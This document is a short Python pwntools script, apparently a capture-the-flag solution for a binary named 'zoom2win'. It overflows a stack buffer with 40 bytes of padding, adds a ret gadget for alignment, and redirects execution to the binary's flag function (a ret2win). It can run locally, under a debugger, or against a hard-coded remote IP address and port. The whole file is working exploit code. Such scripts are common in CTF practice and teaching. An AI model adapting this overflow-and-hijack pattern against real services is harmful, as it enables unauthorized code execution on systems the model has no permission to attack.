#!/usr/bin/python3
import pwn
path = './zoom2win'
elf = pwn.context.binary = pwn.ELF(path)
if pwn.args.GDB:
    io = pwn.gdb.debug(path, gdbscript="")
else:
    if pwn.args.REMOTE:
        io = pwn.remote("143.198.184.186", 5003)
    else:
        io = elf.process()
mssg = io.recv(4096)
ret = 0x000000000040101a
payload = b"A"*32
payload += b"A"*8
payload += pwn.p64(ret)
payload += pwn.p64(elf.sym.flag)
io.sendline(payload)
io.interactive()
